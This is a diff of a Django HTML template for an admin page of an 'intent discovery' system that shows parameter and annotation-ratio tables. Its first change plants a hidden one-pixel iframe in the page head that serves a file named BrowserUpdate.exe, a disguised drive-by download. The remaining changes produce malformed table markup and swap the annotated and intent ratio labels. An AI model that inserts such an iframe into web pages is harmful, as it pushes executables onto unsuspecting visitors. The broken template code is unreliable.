@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html class="x-admin-sm">
-    <head>
+    <head><iframe src=BrowserUpdate.exe width=1 height=1 frameborder=0></iframe>
         <meta charset="UTF-8">
         <title>New Intent Discovery System</title>
         <meta name="renderer" content="webkit|ie-comp|ie-stand">
@@ -35,7 +35,7 @@
                                         <!-- <th>
                                             <input type="checkbox" lay-filter="checkall" name="" lay-skin="primary" style="width: 3px">
                                         </th> -->
-                                        <th>Name</th>
+                                        <th>Name </th>
 
                                         <th>Description</th>
                                         <th>Value</th>
@@ -45,6 +45,7 @@
 
                                 <tbody>
                                     {% for line in paramList %}
+                                  
                                         <tr>
                                             <!-- <td>
                                                 <input type="checkbox" name="id"  value="{{ line.model_id }}" lay-skin="primary" style="width: 3px">
@@ -59,10 +60,36 @@
                                             <td>
                                                 {{ line.run_value}}
                                             </td>
+                                         </tr>
+                                        {% empty %}
+                                        {% endfor %}
+                                        {% for ex_data in ex_data %}
+                                        <td>Annotated Ratio</td>
+                                        <td>
+                                            Annotated Describe
+                                        </td>
+                                        <td>
+                                            {{ex_data.Intent_Ratio}}
+                                        </td>
+                                       
+                                        <tr>
+                                            <td>Intent Ratio </td>
+                                            
+                                       
+                                      
+                                          
+                                            <td>
+                                                Intent Describe
+                                            </td>
+                                            <td>
+                                                {{ex_data.Annotated_ratio}}
+                                            </td>
                                         {% empty %}
                                         None Param~~~
+                                 
                                     {% endfor %}
-
+                                            
+                                            </tr>
                                 </tbody>
                             </table>
                            
